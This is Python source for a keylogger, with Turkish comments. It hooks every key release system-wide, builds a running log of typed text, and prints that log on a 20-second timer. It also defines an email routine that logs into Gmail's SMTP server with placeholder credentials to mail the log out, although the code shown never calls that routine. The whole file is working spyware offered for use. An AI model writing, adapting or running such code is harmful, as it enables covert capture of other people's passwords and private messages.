import keyboard
import smtplib
from threading import Semaphore, Timer

SEND_REPORT_EVERY = 20
EMAIL_ADDRESS = "alıcı_mail_gir"
EMAIL_PASSWORD = "alıcı_mail_sifre_gir"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        # on_release ayarlandıktan sonra bloklanır
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        klavye olayları gerçekleşince çağrılacak alan
        """
        name = event.name
        if len(name) > 1:
            # özel karakter yok (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        """
       self.log gönderildikten sonra her defasında sıfırlanır 
        """
        if self.log:
            print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()

        self.semaphore.acquire()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()